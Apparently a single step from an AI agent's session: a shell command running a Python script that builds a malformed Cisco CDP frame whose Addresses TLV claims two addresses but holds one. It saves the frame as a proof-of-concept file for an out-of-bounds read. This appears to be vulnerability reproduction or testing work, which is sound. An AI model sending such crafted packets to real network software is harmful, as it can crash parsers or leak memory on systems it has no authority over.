message:
Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
# Ethernet 802.3 + LLC/SNAP + CDP header + one Addresses TLV declaring two addresses but containing one.
b = bytearray()
b += bytes.fromhex('01000ccccccc')          # CDP multicast destination
b += bytes.fromhex('00e01ed5d515')          # source MAC
# len_eth is CDP+LLC length after Ethernet length field: LLC 8 + CDP hdr 4 + TLV header 4 + address payload 13 = 29
b += (29).to_bytes(2,'big')
b += bytes.fromhex('aaaa0300000c2000')      # LLC SNAP Cisco CDP
b += bytes([2, 180])                         # CDP version, TTL
b += bytes.fromhex('0000')                   # checksum ignored
b += (2).to_bytes(2,'big')                   # CDP_TLV_ADDRESSES
b += (17).to_bytes(2,'big')                  # TLV total length = header 4 + payload 13
b += (2).to_bytes(4,'big')                   # number of addresses says 2
b += bytes([1,1,0xcc])                       # protocol type/len/IP
b += (4).to_bytes(2,'big')                   # address length
b += bytes([192,168,10,1])                   # one IPv4 address only
Path('/workspace/poc_cdp_addr_oob.bin').write_bytes(b)
print(len(b), b.hex())
PY
